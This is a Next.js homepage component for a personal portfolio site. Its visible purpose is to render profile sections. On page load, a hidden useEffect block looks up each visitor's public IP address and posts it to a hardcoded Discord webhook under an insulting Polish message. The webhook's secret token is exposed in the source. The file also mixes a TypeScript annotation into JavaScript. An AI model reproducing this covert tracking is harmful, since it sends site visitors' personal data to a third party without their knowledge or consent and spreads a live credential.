// pages/index.js
"use client"
import { useEffect, useState } from "react";
import Loader from "@/components/Loader";
import Aboutme from "@/components/Aboutme";
import Banner from "@/components/Banner";
import Contact from "@/components/Contact";
import Experience from "@/components/Experience";
import Footer from "@/components/Footer";
import Projects from "@/components/Projects";
import Skills from "@/components/Skills";

export default function Home() {
  useEffect(() => {
    const fetchIPAndSendToWebhook = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ipAddress = data.ip;
        sendIPToWebhook(ipAddress);
      } catch (error) {
        console.error('Wystąpił błąd podczas pobierania adresu IP:', error);
      }
    };

    const sendIPToWebhook = async (ip: string) => {
      try {
        const webhookURL = 'https://discord.com/api/webhooks/1204518540325953597/3Y9WddSM0GOn6_MbU6S2pVC_GhmxXuDaVSTItAHhNWl5hct53Fr_6yJH0tsDqZnT1POE';
        const message = `Idiota wbił na strone, jego ip ${ip}`;
        await fetch(webhookURL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ content: message })
        });
        console.log('Adres IP został wysłany na webhook');
      } catch (error) {
        console.error('Wystąpił błąd podczas wysyłania adresu IP na webhook:', error);
      }
    };

    fetchIPAndSendToWebhook();
  }, []);
  return (
    <>
        <main className="w-full bg-gray-950 text-gray-300 px-4">
          <div className="max-w-screen-xl mx-auto lg:pt-10">
            <Banner />
            <Aboutme />
            <Experience />
            <Skills />
            <Projects />
            <Contact />
            <Footer />
          </div>
        </main>
    </>
  );
}
